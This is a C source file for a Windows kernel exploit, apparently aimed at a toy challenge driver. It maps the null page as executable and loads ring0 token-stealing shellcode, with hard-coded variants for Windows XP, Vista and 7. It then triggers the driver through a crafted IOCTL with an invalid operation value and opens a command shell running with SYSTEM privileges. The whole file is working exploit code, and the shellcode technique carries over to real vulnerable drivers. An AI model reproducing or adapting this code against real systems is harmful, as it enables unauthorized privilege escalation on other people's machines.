/*
    @0vercl0k - 0vercl0k.tuxfamily.org :)
*/

#include <windows.h>
#include <winioctl.h>

#pragma comment (lib, "ntdll.lib")
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define IOCTL_F4 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DEVICE_NAME "\\\\.\\2"

/* Get the same token than SYSTEM process - ring0 */

BYTE escalade_privileges_ring0_winxp[] = "\x60\x66\xbb\x24\x01\x64\x67\x8b\x07\x8b\x40\x44\x89\xc5\x31\xc9\xb1\x88\x66\x01\xc8\x8b\x10\x89"
"\xd0\x83\x7a\xfc\x04\x74\x02\xeb\xf4\x80\xea\x88\x80\xc2\xc8\x8b\x32\x31\xd2\xb2\xc8\x89\x34\x2a\x61\xc3";

BYTE escalade_privileges_ring0_win7[] = "\x60\x66\xbb\x24\x01\x64\x67\x8b\x07\x8b\x40\x50\x89\xc5\x31\xc9\xb1\xb8\x66\x01\xc8\x8b\x10\x89"
"\xd0\x83\x7a\xfc\x04\x74\x02\xeb\xf4\x80\xea\xb8\x80\xc2\xf8\x8b\x32\x31\xd2\xb2\xf8\x89\x34\x2a\x61\xc3";

BYTE escalade_privileges_ring0_winvista[] = "\x60\x66\xbb\x24\x01\x64\x67\x8b\x07\x8b\x40\x48\x89\xc5\x31\xc9\xb1\xa0\x66\x01\xc8\x8b\x10\x89"
"\xd0\x83\x7a\xfc\x04\x74\x02\xeb\xf4\x80\xea\xa0\x80\xc2\xe0\x8b\x32\x31\xd2\xb2\xe0\x89\x34\x2a\x61\xc3";

typedef enum
{
    ChangeLabel,
    IncreaseAlcoholPercentage,
    DecreaseAlcoholPercentage
} OPERATION;

typedef struct
{
    OPERATION op;
    BYTE alcohol_percentage;
    BYTE label[256];
} FORCE4,
  *PFORCE4;

typedef enum
{
    WinXp,
    WinVista,
    Win7,
    UnknownVersion
} WINDOWS_OS_VERSION;

extern NTSTATUS WINAPI NtAllocateVirtualMemory(
  __in     HANDLE ProcessHandle,
  __inout  PVOID *BaseAddress,
  __in     ULONG_PTR ZeroBits,
  __inout  PSIZE_T RegionSize,
  __in     ULONG AllocationType,
  __in     ULONG Protect
);

VOID SetExecutionOnCore0()
{
    DWORD_PTR mask = 1;

    SetProcessAffinityMask(
        GetCurrentProcess(),
        mask
    );
}

WINDOWS_OS_VERSION GetWindowsVersion()
{
    WINDOWS_OS_VERSION v = 0;
    DWORD version = 0, minVersion = 0, majVersion = 0;

    version = GetVersion();

    minVersion = (DWORD)(HIBYTE(LOWORD(version)));
    majVersion = (DWORD)(LOBYTE(LOWORD(version)));

    if(minVersion == 1 && majVersion == 6)
        v = Win7;
    else if(minVersion == 0 && majVersion == 6)
        v = WinVista;
    else if(minVersion == 1 && majVersion == 5)
        v = WinXp;
    else
        v = UnknownVersion;

    return v;
}

BOOL AllocateNullPage(DWORD size)
{
	NTSTATUS status;
	DWORD addr = 1, len = size;

	status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        (PVOID*)&addr,
        0,
        &len,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

	if(!NT_SUCCESS(status))
	{
		printf("[-] Error with ZwAllocateVirtualMemory : 0x%.8x\n", status);
		return FALSE;
	}

	return TRUE;
}

int main()
{
    DWORD byte = 0;
    STARTUPINFO si = {0};
 	PROCESS_INFORMATION pi = {0};
    HANDLE hDevice = NULL;
    FORCE4 force4 = {0};
    PBYTE escalade_privileges_ring0 = NULL;

    SetExecutionOnCore0();

    printf("Allocating memory..\n");
    if(AllocateNullPage(0x2000) == FALSE)
    {
        printf("Error with AllocateNullPage.\n");
        return EXIT_FAILURE;
    }

    switch(GetWindowsVersion())
    {
        case WinXp:
            escalade_privileges_ring0 = escalade_privileges_ring0_winxp;
        break;

        case WinVista:
            escalade_privileges_ring0 = escalade_privileges_ring0_winvista;
        break;

        case Win7:
            escalade_privileges_ring0 = escalade_privileges_ring0_win7;
        break;

        case UnknownVersion:
            printf("The Windows version is not recognized, stopping the exploit right now : ( !");
            return EXIT_FAILURE;
        break;
    }

    printf("Copying the ring0 shellcode..\n");
    memcpy((PVOID)0x1337, escalade_privileges_ring0, strlen(escalade_privileges_ring0));

    printf("Crafting the force4..\n");
    strcpy(force4.label, "I am in ur k3rnel !");
    force4.alcohol_percentage = 137;
    force4.op = 1337;

    printf("- Press to pull the trigger :] -");
    getchar();

    hDevice = CreateFile(
        DEVICE_NAME,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if(hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Error with Createfile : %.8x.\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("Sending payload..\n");

    DeviceIoControl(
        hDevice,
        IOCTL_F4,
        &force4,
        sizeof(FORCE4),
        NULL,
        0,
        &byte,
        NULL
    );

    printf("All right, it's time to execute a shell..\n..with more privileges actually !\n");
    CloseHandle(hDevice);

	si.cb = sizeof(si);

	CreateProcess(
        NULL,
        "cmd.exe",
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    );

    return EXIT_SUCCESS;
}
